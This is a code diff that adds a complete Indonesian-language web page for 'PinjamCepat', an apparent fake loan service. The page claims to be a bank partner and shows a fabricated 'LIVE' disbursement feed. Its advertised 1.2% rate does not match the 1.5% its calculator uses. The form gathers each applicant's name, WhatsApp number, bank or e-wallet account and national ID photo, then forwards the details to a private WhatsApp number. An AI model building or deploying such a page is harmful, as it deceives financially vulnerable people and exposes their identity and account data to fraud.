@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PinjamCepat - Solusi & Pengajuan</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        input[type=range]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 24px;
+            height: 24px;
+            background: #2563eb;
+            cursor: pointer;
+            border-radius: 50%;
+            border: 4px solid white;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        .hidden-step { display: none; }
+        
+        @keyframes glowingBorder {
+            0% { box-shadow: 0 0 5px #2563eb; border-color: #2563eb; }
+            50% { box-shadow: 0 0 20px #60a5fa; border-color: #60a5fa; }
+            100% { box-shadow: 0 0 5px #2563eb; border-color: #2563eb; }
+        }
+
+        .carousel-glow {
+            width: 100%;
+            border: 3px solid #2563eb;
+            border-radius: 20px;
+            overflow: hidden;
+            animation: glowingBorder 3s infinite ease-in-out;
+        }
+    </style>
+</head>
+<body class="bg-slate-50 font-sans text-slate-900">
+
+    <!-- Navigasi -->
+    <nav class="bg-white border-b border-slate-200 sticky top-0 z-50">
+        <div class="max-w-4xl mx-auto px-4 h-16 flex items-center justify-between">
+            <div class="flex items-center gap-2">
+                <i class="fas fa-hand-holding-dollar text-blue-600 text-2xl"></i>
+                <span class="font-bold text-xl tracking-tight">Pinjam<span class="text-blue-600">Cepat</span></span>
+            </div>
+            <div class="text-right">
+                <span class="text-red-600 font-black text-xs italic tracking-tighter">BANK PERMATA PARTNER</span>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Teks Berjalan -->
+    <div class="bg-blue-900 text-white py-2 overflow-hidden whitespace-nowrap border-b border-blue-800">
+        <marquee scrollamount="6" class="font-bold text-xs md:text-sm tracking-wide">
+            SOLUSI PIJAMAN TER MUDAH CEPAT AMAN DAN AMANAH CAIR 1X24jam PENCARIAN BISA MELALUI EWALET SEGERA AJUKAN SEKARANG MUMPUN BUNGA TERENDAH HARI INI 1.2% chat admin 085119265851 🙏
+        </marquee>
+    </div>
+
+    <!-- Halaman 1 -->
+    <div id="step1">
+        <header class="bg-blue-600 py-12 px-4 text-white text-center">
+            <h1 class="text-3xl font-bold mb-2">Solusi Pinjaman Tunai</h1>
+            <p class="text-blue-100 text-sm">Dana cair hingga 20 Juta dengan proses kilat.</p>
+        </header>
+
+        <main class="max-w-4xl mx-auto -mt-8 pb-16 px-4">
+            <div class="bg-white p-8 rounded-3xl shadow-xl border border-slate-100 mb-6">
+                <div class="flex justify-between items-center mb-6">
+                    <label class="font-bold text-slate-700">Jumlah Pinjaman</label>
+                    <span id="amountDisplay" class="text-2xl font-black text-blue-600">Rp 10.000.000</span>
+                </div>
+                <input type="range" id="amountRange" min="1000000" max="20000000" step="500000" value="10000000" class="w-full h-3 bg-slate-200 rounded-lg appearance-none cursor-pointer accent-blue-600">
+                
+                <div class="mt-8">
+                    <label class="font-bold text-slate-700 block mb-4">Pilih Jangka Waktu</label>
+                    <div class="grid grid-cols-3 gap-3">
+                        <button onclick="setTenor(6)" class="tenor-btn py-3 border-2 rounded-2xl font-bold border-slate-200">6 bln</button>
+                        <button onclick="setTenor(12)" class="tenor-btn py-3 border-2 rounded-2xl font-bold border-blue-600 bg-blue-50">12 bln</button>
+                        <button onclick="setTenor(24)" class="tenor-btn py-3 border-2 rounded-2xl font-bold border-slate-200">24 bln</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="bg-slate-900 rounded-3xl p-8 text-white shadow-2xl mb-6">
+                <p class="text-xs opacity-60 mb-1">Estimasi Cicilan/Bulan</p>
+                <h2 id="monthlyPayment" class="text-3xl font-black mb-6">Rp 983.333</h2>
+                <button onclick="showForm()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-black py-4 rounded-2xl shadow-lg transition-all">
+                    AJUKAN SEKARANG
+                </button>
+            </div>
+
+            <!-- Riwayat Transaksi -->
+            <div class="bg-white p-5 rounded-3xl border border-slate-100 shadow-sm">
+                <div class="flex items-center justify-between mb-3">
+                    <h4 class="font-bold text-xs text-slate-400 uppercase">Riwayat Transaksi</h4>
+                    <span class="text-[10px] font-bold text-green-600 bg-green-50 px-2 py-1 rounded-full animate-pulse">LIVE</span>
+                </div>
+                <div id="transactionBox" class="flex justify-between items-center">
+                    <div>
+                        <p class="text-sm font-bold text-slate-800" id="userName">Budi Santoso</p>
+                        <p class="text-[10px] text-slate-400">Baru saja mencairkan dana</p>
+                    </div>
+                    <p class="text-sm font-black text-blue-600" id="userAmount">Rp 5.000.000</p>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- Halaman 2 (Form Pengajuan) -->
+    <div id="step2" class="hidden-step min-h-screen bg-white">
+        <header class="p-6 border-b flex items-center gap-4 bg-white sticky top-0 z-40">
+            <button onclick="hideForm()" class="text-slate-400 p-2"><i class="fas fa-arrow-left"></i></button>
+            <h2 class="font-bold text-lg">Pengajuan Solusi Dana</h2>
+        </header>
+
+        <form onsubmit="submitFinal(event)" class="max-w-xl mx-auto p-8 space-y-6">
+            <div>
+                <label class="block text-xs font-black text-slate-400 uppercase mb-2">Nama Lengkap (KTP)</label>
+                <input type="text" id="inputNama" required class="w-full p-4 bg-slate-50 rounded-2xl border-2 border-slate-100 outline-none focus:border-blue-500">
+            </div>
+            <div>
+                <label class="block text-xs font-black text-slate-400 uppercase mb-2">Nomor WhatsApp</label>
+                <input type="tel" id="inputWA" required placeholder="08xxxx" class="w-full p-4 bg-slate-50 rounded-2xl border-2 border-slate-100 outline-none focus:border-blue-500">
+            </div>
+            
+            <!-- Kolom Pilihan Bank dan Wallet -->
+            <div>
+                <label class="block text-xs font-black text-slate-400 uppercase mb-2">Metode Pencairan (Bank / Wallet)</label>
+                <select id="pilihanPencairan" required class="w-full p-4 bg-slate-50 rounded-2xl border-2 border-slate-100 outline-none focus:border-blue-500">
+                    <option value="" disabled selected>Pilih Bank atau E-Wallet</option>
+                    <optgroup label="BANK">
+                        <option value="BANK BCA">BANK BCA</option>
+                        <option value="BANK BRI">BANK BRI</option>
+                        <option value="BANK BNI">BANK BNI</option>
+                        <option value="BANK MANDIRI">BANK MANDIRI</option>
+                        <option value="BANK PERMATA">BANK PERMATA</option>
+                    </optgroup>
+                    <optgroup label="E-WALLET">
+                        <option value="DANA">DANA</option>
+                        <option value="OVO">OVO</option>
+                        <option value="GOPAY">GOPAY</option>
+                    </optgroup>
+                </select>
+            </div>
+
+            <div>
+                <label class="block text-xs font-black text-slate-400 uppercase mb-2">Nomor Rekening / Akun Wallet</label>
+                <input type="text" id="inputRekening" required placeholder="Masukkan nomor tujuan pencairan" class="w-full p-4 bg-slate-50 rounded-2xl border-2 border-slate-100 outline-none focus:border-blue-500">
+            </div>
+
+            <div>
+                <label class="block text-xs font-black text-slate-400 uppercase mb-2">Ambil Foto KTP (1000x1500px)</label>
+                <input type="file" id="ktpInput" accept="image/*" class="w-full p-4 bg-slate-50 rounded-2xl border-2 border-dashed border-slate-200">
+            </div>
+
+            <button type="submit" class="w-full bg-blue-600 text-white font-black py-5 rounded-3xl shadow-xl mt-4">
+                KIRIM PENGAJUAN SOLUSI
+            </button>
+        </form>
+    </div>
+
+    <script>
+        let currentAmount = 10000000;
+        let currentTenor = 12;
+
+        function formatRupiah(n) {
+            return new Intl.NumberFormat('id-ID', { style: 'currency', currency: 'IDR', maximumFractionDigits: 0 }).format(n);
+        }
+
+        function calculate() {
+            const monthly = Math.ceil((currentAmount + (currentAmount * 0.015 * currentTenor)) / currentTenor);
+            document.getElementById('amountDisplay').innerText = formatRupiah(currentAmount);
+            document.getElementById('monthlyPayment').innerText = formatRupiah(monthly);
+        }
+
+        function setTenor(t) {
+            currentTenor = t;
+            calculate();
+        }
+
+        document.getElementById('amountRange').oninput = (e) => { 
+            currentAmount = parseInt(e.target.value); 
+            calculate(); 
+        };
+
+        function showForm() {
+            document.getElementById('step1').classList.add('hidden-step');
+            document.getElementById('step2').classList.remove('hidden-step');
+            window.scrollTo(0, 0);
+        }
+
+        function hideForm() {
+            document.getElementById('step2').classList.add('hidden-step');
+            document.getElementById('step1').classList.remove('hidden-step');
+            window.scrollTo(0, 0);
+        }
+
+        function submitFinal(e) {
+            e.preventDefault();
+            const msg = `*PENGAJUAN SOLUSI DANA*\nNama: ${document.getElementById('inputNama').value}\nWA: ${document.getElementById('inputWA').value}\nMetode: ${document.getElementById('pilihanPencairan').value}\nRek: ${document.getElementById('inputRekening').value}\nJumlah: ${formatRupiah(currentAmount)}\nTenor: ${currentTenor} Bln`;
+            window.location.href = `https://wa.me/6285119265851?text=${encodeURIComponent(msg)}`;
+        }
+
+        calculate();
+    </script>
+</body>
+</html>
+
